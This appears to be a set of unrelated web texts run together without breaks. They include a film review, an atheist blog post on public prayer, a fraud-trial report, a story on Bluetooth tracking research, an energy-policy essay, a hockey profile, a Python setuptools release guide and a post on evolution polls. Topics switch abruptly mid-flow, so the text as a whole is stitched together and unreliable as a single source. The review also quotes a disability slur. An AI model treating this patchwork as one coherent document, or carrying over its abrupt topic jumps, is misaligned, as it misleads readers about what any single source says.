One of my own faves comes from Danny McBride as the film ’s explosives expert : “ I ’m tryin ’ to put Tiger Balm on this jungle ’s nuts ! ”
There are too many to count from Robert Downey Jr. His exchange with Stiller ’s character about the degree of mental retardation the Academy will accept in an Oscar - nominated character is on - the - mark hilarious ( “ Never go full - retard ! ” ) .
Downey ’s character could easily have come across as racist in the wrong hands , but he plays it just right , and is ably counteracted by relative newcomer Brandon T. Jackson , playing a misogynist rapper named Alpa Chino ( say it out loud to get the joke ) .
As for Jack Black … one has to wonder if Stiller ’s experiences working with Andy Dick on TV were any kind of inspiration .
It ’s no stretch to point out that TROPIC THUNDER is exactly what it ’s parodying — a big , dumb , loud , star - studded entertainment undoubtedly made by spoiled brats and crazies .
When the relatively unknown actor Jay Baruchel tells his costars within the film that he hoped he ’d get laid as a result of appearing in a movie with them , it ’s easy to imagine him thinking that in reality too .

モンズース ー ( 著)
Christians may squabble endlessly over what it means to be a Christian , and many are fond of claiming that only those who believe exactly as they do deserve to be called " real Christians . "
It seems fairly obvious to this author that there must be some common doctrine shared by all Christians .
One of these is the belief that their preferred bible is central to the religion .
Granted , fundamentalists are going to take their bible far more seriously than so - called liberal or moderate Christians , but all seem to agree that it provides an important source of guidance .
So why is it that so many self - identified Christians ignore what their bible says about public prayer ?
What are we to say about a Christian who prays publicly or crusades to promote public prayer ?
Here we seem to have an individual who is either ignorant of what his or her bible says about prayer or is intentionally disregarding it .
For those who truly regard this book as " holy , " that seems like a surprising choice .
The Bible Condemns Public Prayer
The book many Christians seek to elevate above all other books might not be clear about much , but it seems fairly clear in discouraging public prayer .
Matthew 6:5 - 7 says :
5 . And when thou prayest , thou shalt not be as the hypocrites : for they love to pray standing in the synagogues and in the corners of the streets , that they may be seen of men .
Verily I say unto you ,
They have their reward .
6 . But thou , when thou prayest , enter into thy closet , and when thou hast shut thy door , pray to thy Father which is in secret ; and thy Father which seeth in secret shall reward thee openly .
7 . But when ye pray , use not vain repetitions , as the heathen : for they think that they shall be heard for their much speaking .
What Are We To Make Of Christians Who Pray Publicly ?
Pretty clear , is n't it ?
Public prayer is compared to hypocrisy and is discouraged while private prayer is valued .
It seems that their own bible , a text which they themselves claim to be at the center of their faith , condemns public prayer as hypocrisy .
The family exhibiting bowed heads , joined hands , and audible words about Jesus at the local restaurant ?
Hypocrites .
Christian extremists who believe that all school children should have to recite prayers in school or that prayer should be a key part of public school graduation ceremonies ?
Hypocrites .
Senators who begin their meetings with public prayer ?
Hypocrites .
Christian athletes praying together on the field before the game ?
Hypocrites .
Children tormenting each other with prayer circles ?
Hypocrites .
If you are one of these people and reading this makes you mad , I point out that this is what your book says .
If you were n't aware of this fact , I wonder how serious you are about your faith .
Perhaps it is time to consider joining the reality - based community .
On the other hand , if you knew this was in your bible and simply ignored it , I have to ask what gives you license to selectively follow only those aspects of your religion you like ?
This is a revised and expanded version of a post that first appeared on Atheist Revolution in 2007 .
Chuck Norris
Facts have made us laugh so many times since they surfaced .
While they are not made up by Chuck himself , they still deserve the credit and respect that Chuck would demand .
Whether it is his roundhouse kicks , cure for cancer , or simply being Chuck , these facts are not to be taken lightly .
And here is another Chuck Norris fact : If Chuck Norris replaced Mario in Super Mario Brothers , Nothing would Live .
I am not certain how long it took to create this video below , but it is so entertaining .
Someone recreated the famous first stage of Super Mario Brothers but Mario is nowhere to be found .
A new Sheriff came to town , or should I say : Walker , Texas Ranger , and the classic game is now called : Super Chuck Norris .
Actually , Chuck kicks major ass in this game , I mean major .
Have fun !

Anne Darwin was living in Panama when her husband reappeared Back - from - the - dead canoeist John Darwin cried and begged his wife to let him come home after faking his own death , Teesside Crown Court has heard .
But Anne Darwin , 56 , told detectives probing her role in a £ 250,000 fraud she was minded to leave him in hiding .
The court heard it later emerged she sent him an e-mail from Panama asking him not to leave her , just hours before he handed himself in to UK police .
Mrs Darwin denies deception and money - laundering charges .
Mr Darwin has admitted deception and will be sentenced later .
He vanished after his canoe was found in the sea close to his home at Seaton Carew , Hartlepool , in 2002 .
I knew it was stupid but , once I set out along the road , it was difficult to turn back
Anne Darwin
The jury was read transcripts of interviews between Mrs Darwin and police which were taken after Mr Darwin 's reappearance and the couple 's subsequent arrest last year .
She told officers that her husband had pleaded to come home from his Lake District hiding place within weeks of his disappearance and how finally she relented .
The transcript read : " I still had family staying with me .
He was finding it hard .
He was getting desperate .
" He phoned me and gave me directions to where he was .
" I wanted to leave him there .
I did n't want to go and pick him up , but I could n't leave him .
" At one point , he was literally crying on the telephone .
" I could n't see him hurt . "
The court was told how his faked death allowed Mrs Darwin to clear their mounting debts by making insurance and pension claims worth £ 250,000 , and she emigrated to Panama last year to start a new life with him .

But he flew back to Britain and walked into a central London police station in November , claiming he had amnesia .
Mrs Darwin admits the deceptions took place , but is putting forward the defence of marital coercion , meaning she was forced to break the law against her will .
While he was in the air , Mrs Darwin , 56 , wrote in am e-mail : " Hope you had a good flight and everything okay with the family .
Do n't leave me .
Love you , missing you already XXXXXX . "
The jury heard that after returning , Mr Darwin lived next door in a bedsit in the property adjoining the seafront family home .
Mrs Darwin told police that she had protested to her husband that they should declare themselves bankrupt .
" But he just would n't hear it .
He said we had both worked hard all our lives and he did n't want to lose everything he had worked for , " the transcript read .
Mark ( right ) and Anthony Darwin were at Teesside Crown Court on Tuesday " He was not violent , but could be very manipulative .
" I used to say he treated me like a second year pupil that he used to teach .
" From the day he came home , I tried to persuade him to come clean .
" I knew it was stupid but , once I set out along the road , it was difficult to turn back . "
The former doctors ' receptionist told officers that deceiving their two sons Mark and Anthony Darwin had been " extremely painful " .
She had allowed her husband to hear phone calls with their sons by putting them on loudspeaker , the court heard .
The jury was told that Mr Darwin eventually set up a new life in Panama and that e-mails had been exchanged between the couple before his wife moved to the Central American country .
' Kind of numbness ' Police accessed Mr Darwin's Yahoo account , set up the name of John Jones - the identity he assumed after faking his death - and were able to read 89 messages .
One urged his wife to join him in Panama " fast " , while his wife sent a message inquiring about a book he was writing .
Irene Blakemore , the best friend of Mrs Darwin , told the court that she felt betrayed by the lies spun to her .
Telling of a visit to her friend 's home after the disappearance , she said : " ( Anne ) appeared quite calm but I was n't surprised that she was not weeping and wailing because she came across as a quite self - contained person and not one to make a fuss .
" There was a kind of numbness . "
Mrs Blakemore also said Mrs Darwin had marked the first anniversary of her husband 's " death " by taking flowers to the sea where the battered canoe had been found , one of which she kept for her bedside table .
She added that Mrs Darwin had appeared " shaky " after the inquest into Mr Darwin 's death in April 2003 .
Mrs Darwin denies six counts of deception and nine money - laundering charges linked to insurance payments .
The trial continues .

What are these ?
Tens of thousands of Britons are being covertly tracked without their consent in a technology experiment which has installed scanners at secret locations in offices , campuses , streets and pubs to pinpoint people 's whereabouts .
The scanners , the first 10 of which were installed in Bath three years ago , are capturing Bluetooth radio signals transmitted from devices such as mobile phones , laptops and digital cameras , and using the data to follow unwitting targets without their permission .
The data is being used in a project called Cityware to study how people move around cities .
But pedestrians are not being told that the devices they carry around in their pockets and handbags could be providing a permanent record of their journeys , which is then stored on a central database .
The Bath University researchers behind the project claim their scanners do not have access to the identity of the people tracked .
Eamonn O'Neill , Cityware 's director , said : " The objective is not to track individuals , whether by Bluetooth or any other means .
We are interested in the aggregate behaviour of city dwellers as a whole .
The notion that any agency would seriously consider Bluetooth scanning as a surveillance technique is ludicrous . "
But privacy experts disagree , pointing out that Bluetooth signals are assigned code names that can , to varying degrees , indicate a person 's identity .
Many people use pseudonyms , nicknames , initials , or abbreviations to identify their Bluetooth signals .
Cityware 's scanners are also picking up signals that are listed using people 's full name , email address and telephone numbers .
Contacted about the Cityware project , the office of the information commissioner said in a statement that the public should " think carefully " before switching on their Bluetooth signals .
A spokesman said the government watchdog would " monitor " the experiment .
" This is yet another example of moronic use of technology , " said Simon Davies , director of Privacy International , an independent campaigning group defending personal privacy .
" For Bath University to assert that there are n't privacy implications demonstrates an astonishing disregard for consumer rights .
If the technology is as safe as they claim , then all the technical specifications should be published and people should be informed when they are being tracked . "
He added : " This technology could well become the CCTV of the mobile industry .
It would not take much adjustment to make this system a ubiquitous surveillance infrastructure over which we have no control . "
Although initially confined to Bath , Cityware has spread across the planet after the software was made freely available on the internet sites Facebook and Second Life .
Thousands of people downloaded the software to equip their home and office computers with Cityware scanners .
More than 1,000 scanners across the world at any time detect passing Bluetooth signals and send the data to Cityware 's central database .
Those with access to the database admit they do not know precisely how many scanners have been created , but there are known to be scanners in San Diego , Hong Kong , Australia , Singapore , Toronto and Berlin .
In Bath alone scanners are tracking as many as 3,000 Bluetooth devices every weekend .
One recent study used the scanners to monitor the movements of 10,000 people in the city .
About 250,000 owners of Bluetooth devices , mostly mobile phones , have been spotted by Cityware scanners worldwide .
O'Neill , who described his project as " public observation " rather than surveillance , said the data would improve scientific understanding of the privacy and security threats posed by Bluetooth technology .
A " potentially immensely valuable side - effect " , he added , was that data about people 's movements could help research into the spread of biological epidemics .
" Just as we continue to research forms of defence against other more traditional threats , we must research forms of defence against new digital threats , " he said , adding that the database eventually would be destroyed .
However Vassilis Kostakos , a former member of Cityware who now does Bluetooth experiments on buses in Portugal for the University of Madeira , accepted such tracking was a problem .
" We are actually trying to fix this , " Kostakos said .
" If a person 's phone is talking to a scanner , then they should be told about it .
Any technology can have good and bad consequences .
In many ways , I think the role of a scientist is to point out both .
I agree this is complex and I agree there are harmful scenarios . "
The technique has echoes of the thriller Enemy of the State in which the character played by Will Smith is followed by satellite surveillance .
Kostakos said he could foresee complex ways in which criminals could exploit the technology , adding : " I recently tried to look at people 's travel patterns across the world , and we [ saw ] how a unique device which showed up in San Francisco turned up in Caracas and then Paris . "
Bluetooth tracking technology is already being used to aim advertisements at people , for example as they walk past shops or billboards .
Bluetoothtracking.org , a website based in the Netherlands , is using the same technology to publish live data about people 's movements across the town of Apeldoorn .
The facility allows people to search the whereabouts of friends and associates without them knowing about it .
Some scientists using the technology describe a future scenario in which homes and cars adapt services to suit their owners , automatically dimming lights , preparing food and selecting preferred television channels .
A number of participants in the energy debate have recently suggested that what America needs is a new federal project on the scale of the Manhattan Project or the Apollo Project that brought large scale teams together to achieve great things .
My suggestion is that the better model to follow would be Eisenhower ’s Interstate Highway project – or a much more ancient model .
As successful as Manhattan and Apollo were at achieving their stated goals , both share a common flaw as a model for attacking our energy supply challenges – they were sprints that left their respective teams panting and wiped out when the initial goal was achieved .
In contrast , the Interstate Highway system was a more distributed , long - term effort whose accomplishment required a sustained , methodical approach lasting more than 50 years ( so far ) .
It was more of an endurance relay event than a sprint .
We did not achieve our current level of dependence on fossil fuels quickly or accidentally ; transitioning to a new energy supply system will not be quick or easy .
It would also be a mistake to favor solutions based on the speed with which they can be implemented instead of their long term durability and sustainability .
Both Manhattan and Apollo operated under tight deadlines ; great technological suggestions that required too much development were abandoned instead of being steadily worked for later implementation .
One of the key distinguishing characteristics of the Interstate Highway system was the development of a mechanism for funding large scale , interconnected projects that took local needs into account while directing the bill to the people that received the most benefit .
Using fuel taxes was a brilliant move ; the more companies and individuals used the roads , the more they paid in taxes to build more roads .
It is disheartening to me to hear people deride long - term actions like building a nuclear power plant construction and support infrastructure or continued exploration for new sources of hydrocarbons while cheering efforts to implement moderate energy savings programs immediately .
It is also disappointing to hear supposedly serious commentators expect that private , speculative investors will come to the rescue .
High - risk capital investors will take big chances , but their time horizon is normally 7 years or less .
Lower risk investors will provide patient capital , but they need markets that are structured to support predictable income over long periods of time .
One thing that scares long term investors away is regulatory uncertainty ; today , some of the big energy related uncertainties are the rules associated with carbon dioxide emissions and the regulatory challenges associated with all large scale power plants , especially nuclear power plants .
Much has been said about the impact of commodity speculators in the energy markets , but if they have been important , the reason for their importance is a recognition that real solutions are not being aggressively pursued .
Speculators try to predict the future and maneuver to prosper in whatever circumstances that the future brings ; right now , the popular bet appears to be that we will be living in a constrained world beset by energy costs that eat up 6 - 15 % of a family budget .
Of course , it should be no secret to anyone that there are some very powerful and even some not so powerful people who like the energy markets just the way that they are .
The longer the rest of us dally and debate , the longer we will remain addicted to fossil fuels .
The pushers like that and encourage us to keep on discussing .
They also support short term thinking – it is in their long term financial interest to keep people focused on marginal improvements or on intermittent , unreliable power sources that require us to continue turning back to them for assistance when we really need power .
This weekend I played a bit with some numbers available from the U. S. Energy Information Agency ’s Annual Energy Review ( Table 1.3 ) .
I think that the resulting graph clearly shows what we have learned from the past forty years of trying to develop alternatives to fossil fuels .
According to one of the most virulent nuclear critics , the total subsidy to nuclear power from 1950 - 1990 ( when all subsidies to our existing plants stopped ) was $ 97 billion ( 1990s dollars ) .
The annual return from that investment is more than 800 Terawatt - hours of electricity valued at approximately $ 40 - 80 billion depending on your assumption for the value of a kilowatt hour .
Just think where we would be today if we had not quit building and had not abandoned much of the infrastructure that investment enabled .
Photo explanation – Last summer , my wife and I spent a week on the Rhine River .
One of the more thought provoking sights was the Cologne Cathedral ; a monument to faith and perseverance whose construction started in 1248 and lasted until 1880 .
It is a dramatic example of what can be accomplished by an endurance relay of visionaries and long term thinkers .
The haze , by the way , is partially caused by the large concentration of coal burning power plants in that section of Germany .

The US news media is fascinated by the Kennedys .
Fascinated with smearing them , fascinating with sensationalizing them , fascinated with the process of making them disappear .
How often have you seen Robert F. Kennedy Jr. on mainstream TV news ?
Not very often .
This video shows why .
WHITEHAVEN , England 
The citizens of Whitehaven try , really they do .
They separate out their cans , their paper , their cardboard and their glass , and they recycle them all .
They compost .
They jump up and down on their trash to cram it into their government - issued garbage cans , and they put the trash out for collection at exactly 7 a.m. , twice a month .
But when Gareth Corkhill , a bus driver , was fined $ 215  and given a further $ 225 fine and a criminal record when he failed to pay  for leaving his garbage can lid slightly ajar this spring , Whitehaven ’s residents banded together in dismay .
They raised the money to pay the fine , and they began to complain .
“ I consider the fine against Mr. Corkhill to be a matter of injustice , really , and as a Christian minister I ’m required to speak out against injustice , ” declared the Rev. John Bannister , the rector of Whitehaven , a seaside town in Cumbria , in the far northwest .
Referring to the garbage cans residents here use , he said , “ To be given a criminal record for leaving your wheelie bin open by three inches has , I think , really gone beyond the bounds of responsible behavior . ”
Across Europe , residents are struggling to adjust to a new era of garbage rules .
Britain , particularly , is in the midst of a trash crisis , with dwindling landfill space and one of Europe ’s poorest recycling records .
Threatened with steep fines if they dump too much trash , local governments around the country are imposing strict regimens to force residents to produce less and recycle more .
It 's the kind of car they give all the imports on Hockey Club Davos — a nondescript , gray hatchback made distinct by the golden - horned elk of HCD painted on both doors .
It slips and slides along the snow - covered road , wipers working hard to clear the windshield of persistent flakes , headlights cutting a bright swath in the nighttime blackness of the Swiss Alps .
A dog darts across the road , then disappears as quickly as it came .
In the passenger seat , Robin Leblanc curses under his breath in French .
But in the driver 's seat , Alexandre Daigle is calm .
His grip on the wheel is loose .
Relaxed .
Because although the road may be treacherous , Daigle has never felt so in control .
On this December evening , Daigle is headed for the Walserhuus , a restaurant his new coaches took him to on his first night in Davos two years ago .
Located in a rustic lodge with twinkly lights high above Davos , the place is famous for its fondue chinoise .
Fifteen years ago , Daigle could have — maybe should have — been famous too .
At least that 's what the Senators thought .
After Ottawa finished its first season with a 10 – 70 – 4 record , they were guaranteed the top pick in the unusually rich 1993 draft class , which included Daigle , Chris Pronger and Paul Kariya .
A No. 1 is a jump start for teams needing a boost out of the basement , and the choice is usually a player whose skills and potential far outshine those of the rest of his class .
( The 2008 draft will be held June 20 - 21 in Ottawa .
See below . )
And while it 's true that in the draft 's 45 - year history only five No. 1 's — Guy Lafleur , Denis Potvin , Mario Lemieux , Mike Modano , Vincent Lecavalier — have led the teams that chose them to a Cup , a championship is still the gold standard .
A real chance of winning one justifies years of scouting reports , countless physical and psychological evaluations and endless interviews with coaches , teammates , parents , siblings and , of course , the players themselves .
If a franchise is to place all its eggs in one basket , it wants to be sure the bottom wo n't fall out .
But can you ever be really certain ?
NBA and NFL teams can draft players at 19 and 20 , respectively , but even one year of college grants time to mature physically and mentally .
A hockey player , meanwhile , is draft - eligible on his 18th birthday , when he is still a work in progress , a mere whisper of the man he will become .
As a result , the NHL draft , like that in baseball , is an inexact science at best .
Still , the Sens were pretty damn sure they had it right when they made Daigle , the scoring machine from Laval , Quebec , their top pick .
Scouts called him the next Gretzky .
The Senators expected him to be the future of their franchise , and Daigle expected nothing less of himself .
But despite his skill , movie star looks and bilingual charm , he would never live up to his nickname , Alexandre the Great .
There is no shortage of theories why , and most point directly to unfair expectations .
Maybe it was the burden of those astounding numbers Daigle posted in juniors ( 281 points in 137 games ) .
Maybe it was the pressure that came from the widely held suspicion that Ottawa purposely dropped games in March and April 1993 to guarantee a last - place finish and the No. 1 pick .
Or maybe it was the weight of that $ 12.5 M contract , the largest starting salary in NHL history .
Whatever the reason , Ottawa 's media and fans wanted perfection , or at least a Calder Trophy , to justify the hype .
No Calder nomination came , and 54 goals in 217 games over the next four seasons were n't enough .
In 1998 , the Sens washed their hands of Daigle , who wore eight different sweaters over the next seven - plus seasons .
Players drafted after him ( Pronger , Kariya , Todd Bertuzzi ) became stars while he became disenchanted — the sport he loved was now a job , his boyhood dream a chore .
In the summer of 2006 , with his NHL stock at an all - time low , Daigle crossed the pond to play in Switzerland .
It was the best move he ever made .
Vaillant Arena , smack in the center of the ski village of Davos , is crafted of knotty pine and boasts the pitched , snow - covered roof of a ski lodge .
It holds 7,000 people , if you count those willing to stand , and today the arena is packed .
Fans in blue - and - yellow Davos jerseys , hats and scarves wave giant blue - and - yellow flags and pound blue - and - yellow drums .
Amid the mayhem , Daigle is glaringly easy to spot .
Yes , those are red - and - orange flames on his helmet and jersey .
That 's because he is , figuratively , on fire .
At least on the score sheet , which is why he wears the uniform reserved for the team 's top scorer .
The flaming jersey is a league custom many find absurd — " Bullshit , " Davos coach Arno del Curto calls it — but Daigle has been wearing it for much of the past two seasons .
Watch , and he 'll show why .
In the second period , the six - foot , 195 - pound center catches a pass just beyond the red line and dekes around the defenseman backing into his own zone .
As the blueliner spins to follow , Daigle turns on jets that once made NHL scouts salivate ; it 's obvious he has n't lost a stride .
He gains clear ice and snaps a shot just inside the left post .
" I have great speed , " Daigle says .
" The bigger ice over here gives me three more strides to get a shot without somebody hanging all over me . "
Tonight , Davos beats Rapperswil , 6 - 1 , and Daigle 's goal keeps him ahead of teammate Reto Von Arx as the team 's leading scorer .
A season earlier , Daigle had 22 goals and 61 points in 44 games , and HC Davos won its third Swiss championship in five years .
Following that season , Daigle signed a four - year contract extension that will keep him in Switzerland until 2011 .
That 's more success than he ever had in the NHL .
" When you 're young , you think the NHL is glamorous and fun , " says Daigle , now 33 .
" But it 's a tough job .
You have to be made a special way to deal with it .
Me , I 'm not aggressive at all .
Zero percent . "
In juniors , talent had been enough , and Daigle was a fierce scorer for the Victoriaville Tigres of the Quebec League .
" He 'd just get the puck and fly by guys , " says then - Sens scout Jim Nill .
" But maybe he relied too much on his skill .
When it comes time to get to that next level , you have to ask yourself how you 're going to compete . "
It should have been impressive that an 18 - year - old boy could play a man 's game and score 20 goals with no support on a team that won just 14 games his rookie season .
But fans and media wanted a scapegoat , and Daigle was it .
He was n't the next Gretzky and they would n't let him forget it .
An " Unofficial Alexandre Daigle Sucks " website appeared on the still - young Internet .
Add the arduous 82 - game schedule , nine - day road trips , late - night flights and early - morning buses to negative press and the game became too intense for the lighthearted Daigle .
For the first time he dreaded coming to the rink .
He left Ottawa a persona non grata , more famous for an alleged score with Pamela Anderson than for any scoring he did on the ice .
Daigle bounced from team to team : Flyers , Lightning , Rangers , Penguins and Wild , along with AHL affiliates in Hartford , Wilkes - Barre and Manchester .
After the 1999 -2000 season , the first in which he spent serious time in the minors , he took a two - year NHL hiatus and started a production company of sorts in Hollywood and skated for a Beverly Hills beer - league team with former NHLer Marty McSorley .
He returned to the NHL in 2002 , citing a renewed passion for a game that would never love him back .
During the 2003 - 04 season , Daigle tied his career high of 51 points with the Wild , but the lockout killed the next season and the NHL 's subsequent game - opening rules changes came too late .
And while offense - first players like Atlanta 's Ilya Kovalchuk and Columbus ' Rick Nash learned to love backchecking in the postlockout NHL , that was a simple trick compared to the black magic needed to give Daigle a killer instinct .
So his God - given talent was deemed expendable as GMs league - wide grew wary of signing a player who seemed unwilling to compete .
Daigle was branded , his work ethic questioned , his time up .
" I always thought I 'd play 15 or 20 seasons in the NHL , " he says .
" But the time comes when you have to face reality . "
The reality was that Daigle still wanted to play , and when del Curto heard he was considering Europe , the coach offered him a two - year deal and the comfort of knowing , for the first time since leaving Ottawa , where he'd be hanging his skates for two solid seasons .
Daigle called Boston center Joe Thornton , who spent the lockout playing in Davos .
" He told me it was a fun team in a fun town with good skiing , " Daigle says , " and that they 'd won a couple of championships . "
For Daigle , " fun " was the operative word .
What a difference a few years and a fresh country can make .
Hockey in the Swiss League is better than the American Hockey League but not quite as good as the Russian Super or Swedish Elite Leagues .
But for Daigle , it 's everything the NHL is not .
HC Davos plays a 50 - game schedule , usually just two games a week .
Teams travel by bus , and even after away games Daigle sleeps in his own bed .
Between Christmas and New Year 's , league play stops and Davos hosts the Spengler Cup , essentially a wintertime block party with hockey games in the afternoon .
Media coverage is in German , and even though Daigle and his wife , Genevieve , are taking classes to learn the language , he could n't read the papers if he wanted to .
And he does n't .
Daigle has made a life here in the Alps .
He and Genevieve — along with dogs Gucci , a mini Doberman , and Zoe , a Yorkshire Terrier — share an apartment with a balcony that looks over the village .
On Daigle 's days off it's a short hop to Zurich and Milan to shop and stock up on Italian reds .
Meanwhile , Davos ' status as an international destination — the World Economic Forum is held there every year — means the Daigles do n't want too much for cosmopolitan Montreal .
So it 's hardly surprising that as the snow piles up outside , Daigle looks more than content to settle in behind a massive platter of raw beef and venison and a pot of boiling bouillon at the Walserhuus with Leblanc , a fellow Quebecois .
" When I retire I 'm going to be 225 pounds , " says the once and former hockey savior .
But it 's as tough to imagine Daigle getting fat as it is to view him as a draft - day cautionary tale .
The talent the Sens saw is still there , only now it's in the service of Alexandre Daigle .
Instead of slogging through the NHL 's soul - sapping winter grind he can anticipate the fast - approaching Swiss League playoffs and birth of his first child .
[ Ed. 's note : Daigle scored 11 points in two rounds before Davos was knocked out ; daughter Sienna was born in March . ]
Instead of wondering who he 'll disappoint tomorrow , he can know who he 's thrilling today .
And it does n't matter that the thrills are 4,000 miles away from the NHL .
Disclaimer : this post is Subversion - centric
When releasing a setuptools based - package to the world , developers will eventually tag it as a stable version , then upload it to PyPI or to their own website .
So typically they create a branch out of the trunk , fix the version , then create a tag for the release .
Now for continuous development releases , where people get for example a daily snapshot from the trunk , having a dev suffix to the egg version makes it possible to distinguish it from a stable release , so ‘ my.package -2.4dev ’ will not superseed ‘ my.package -2.4 ’.
So a given package will need a dev prefix in its trunk , that gets removed in the branch where the next release occurs .
From there , easy_install will be able to distinguish them .
The question is : how should we do this ?
The Zope 3 way
The Zope 3 egg collection has a simple way to manage it , describe here : http://svn.zope.org/*checkout*/Sandbox/philikon/foundation/releasing-software.txt.
The packages have a dev tag suffix in the version metadata , that is removed in the subversion branch used to tag and release
This is simple and straight forward .
Although , releasing the trunk has to be done manually .
The problem is that any release of the trunk will have the same name for a given version ( my.package - 2.4dev ) , and in some case people wo n’t upgrade their environment because the archive keeps the same name .
The setuptools way
Setuptools comes with a continuous integration feature that allows people to push the dev tag in setup.cfg .
Then it adds it automatically to the archive name when it is generated .
see : http://peak.telecommunity.com/DevCenter/setuptools#managing-continuous-releases-using-subversion
Building a release will then consist of using the same process than Zope 3 one , except that the tag is removed from the setup.cfg file this time .
Now if you try to release the trunk using disutils sdist or bdist_egg command you will automatically get a dev suffix and the Subversion revision number sticked to it .
This means that each new revision can generate a new version that will have a distinct name :
my.package-2.4dev-r1245
my.package-2.4dev-r1246
…
easy_install will grab the latest trunk revision when “ my.package - 2.4dev ” is required , and handle upgrades the right way .
This is better that a manual dev tag because when you re-release a new version of the trunk , it will superseeds and therefore upgrades previous revisions .
Another nice feature is to be able to provide to easy_install a subversion link directly , as long as you append the egg full name to the link :
easy_install http://my.svn/my.package/trunk#egg=my.package-dev
collective .
releaser
The problem with setup.cfg is that if you forget to remove the dev tag from it when releasing a stable version ( you bad boy ) , you will get the dev-r4565 suffix in the egg name .
collective .
releaser takes care of this with a new setuptools command called release , by creating a release branch and removing the dev tag automatically .
It upgrades the CHANGES . txt file and version . txt for Plone products .
It also registers and uploads the package to any PyPI - like server .
To decide where the package should be sent , it looks at the release - packages variable into the . pypirc , to see if the package name matches it .
To release all packages to PyPI a default file would be :
[ distutils ] index- servers = pypi
[ pypi ] username : tarek password : secret # regular expression - based variable release - packages = .*
From there , making a release is as simple as :
$ python2.4 setup.py release running release
This package is version 0.1.1
Do you want to run tests before releasing ? [ y /N ] : n Do you want to create the release ?
If no , you will just be able to deploy again the current release [ y / N ] : y Enter a version [ 0.1.1 ] : 0.1.2 Commiting changes ...
Creating branches ... ...
Running " mregister sdist bdist_egg mupload - r pypi " running mregister Using PyPI login from / home / tarek / .pypirc Registering iw.resourcetraverser to http://pypi.python.org/pypi ... running mupload Using PyPI login from / home / tarek / .pypirc Submitting dist/iw.resourcetraverser-0.1.2.tar.gz to http://pypi.python.org/pypi
Submitting dist/iw.resourcetraverser-0.1.2-py2.4.egg to http://pypi.python.org/pypi ... 0.1.2 released
As described on its PyPI page , it has a plugin system to perform extra steps when a release is made .
For instance , it is provided with a mail hook to be able to send mails everytime a release is made .
The tool is pretty new and needs to be smoothed up .
For instance , we need to add a few extra controls like making sure long_description is reST - valid .
But
It works , and is being used by a few fellows in the Plone community already :) .
Last , for continuous releases from the trunk , you can set up an alias :
$ python setup.py alias devrelease mregister sdist mupload
You will then be able to upload trunk releases with a single call :
$ python setup.py devrelease
The idea is to provide it as the standard tool to release add - on Products when Plone.org will be upgraded and able to interact with distutils commands .
I will promote it through the work I am doing for the PSPS task I am championning ( Improve release procedures for add - on products ) , but it has to live a bit .

About a year ago an Angus Reid poll provided some information regarding the acceptance of evolution in Canada , which was taken by some as the basis for claiming that the level of acceptance of this unifying principle of biology is roughly the same in Canada as in the United States .
Although the results of the AR poll were indeed rather disappointing , they did not indicate an equivalence of views between the two nations .
Here are two relevant press releases from Angus Reid :
U.S. Majority Picks Creationism over Evolution ( April 25 , 2006 )
Most Canadians Pick Evolution Over Creationism ( June 19 , 2007 )
It is true that last year 's poll suggested that nationally a disappointingly low majority of 59 % of Canadians accept the notion of common descent .
However , only 22 % accept young earth creationism .
In Ontario , the data are especially disheartening , with only 51 % of respondents accepting evolution ( but still only half as many choosing creationism ) .
In Quebec , 71 % accept evolution and only 9 % align with creationist ideas .
The original report can be accessed here .
The US poll referred to above ( by CBS ) indicates that 53 % of respondents believe that life was created in its current form within the past 10,000 years by God , 23 % accept a form of evolution guided by God , and 17 % believe in a strictly natural evolutionary account .
The questions in the Canadian poll were not broken down in this way , but this poll still indicates that only 40 % of Americans accept any form of evolution and 53 % believe in a young earth .
Other polls give similar results ( see Miller et al. 2006 , Science 313 : 765-766 ) .
There is , unsurprisingly , a strong relationship between religiosity , political affiliation , and opinion about evolutionary science .
A more recently conducted Gallup poll gave slightly more promising results than the earlier CBS finding , with 43 % choosing young earth creationism , 38 % ascribing to theistic evolution , and 14 % accepting unguided evolution .
This would put the total who accept some form of evolution at 52 % , and when asked directly about evolution , 53 % of respondents considered it to be either " definitely true " ( 18 % ) or " probably true " ( 35 % ) .
However , this encouraging result must be weighed against the fact that when asked directly about young earth creationism , 66 % said it was either " definitely true " ( 39 % ) or " probably true " ( 27 % ) .
As Gallup put it ,
It might seem contradictory to believe that humans were created in their present form at one time within the past 10,000 years and at the same time believe that humans developed over millions of years from less advanced forms of life .
But , based on an analysis of the two side - by - side questions asked this month about evolution and creationism , it appears that a substantial number of Americans hold these conflicting views .
Clearly , Canada does not rank at the level of nations like Iceland , Denmark , Sweden , France , or Japan where public acceptance of evolution is very high ( up to 80 % ) , but neither does it fall in the same category as the United States .
In particular , what we do not see in Canada , at least based on this single survey , is a high level of acceptance of creationism .
Nevertheless , there is much work to do in educating the public in Canada .
Most notably , an alarming percentage ( 42 % ) believe that humans and dinosaurs coexisted despite a majority accepting evolution .
In other words , they are correct about common descent but confused about the details of life 's history .
In some ways this is not surprising , given the countless portrayals of " cavemen " and dinosaurs together in cartoons , movies , and other venues .
I would not be surprised if a majority of people also believe that penguins and polar bears cohabitate while accepting the fact of a round Earth with two poles .
A slightly more recent ( July 3 , 2007 ) poll by Canadian Press - Decima Research provided a breakdown covering young earth creationism , theistic evolution , and naturalistic evolution in the way that American polls sometimes have .
Some quotes from the report summarizing the results :
Less than one in three Canadians ( 29 % ) believe that God had no part in the creation or development of human beings .
Fewer still ( 26 % ) believe “ that God created human beings pretty much in their present form at one time within the last 10,000 years or so ” .
A plurality , but still only 34 % , say that “ human beings have developed over millions of years from less advanced forms of life , but God guided this process ” .
Belief in creationism is lowest in Quebec ( 21 % ) , Alberta ( 22 % ) , and B.C. ( 22 % ) .
In Alberta , the plurality view is that God guided human development ( 39 % ) , while in Quebec the plurality feels God played no part ( 40 % ) .
Rural residents are 12 points more likely than urban dwellers to believe that God created humans in their present form .
Differences by generation are not all that large .
The plurality of women ( 37 % ) believes that God guided the process , while the plurality of men ( 35 % ) believes that God played no part .
In polls using the same question ( Gallup ) put to US residents , findings are different : 45 % said God created humans in more or less their present form ( compared to 26 % in Canada ) , 40 % said that God guided the evolutionary process ( compared to 34 % in Canada ) .
Only 15 % say God played no part ( compared to 29 % in Canada ) .
According to Decima CEO Bruce Anderson
“ These results reflect an essential Canadian tendency : we are pretty secular , but pretty hesitant to embrace atheism .
Our views on the role of science and spirituality lack consensus but these are not polarizing issues for the most part .
It ’s more as though for many , these feelings are unresolved , we believe in a higher being , we know what we do n’t know , are comfortable not knowing , and choose not to press our views upon one another . ”
Overall , Canadians seem intermediate between the USA and Europe on the question of evolution and there is much work still to do here as elsewhere in improving understanding of the subject .

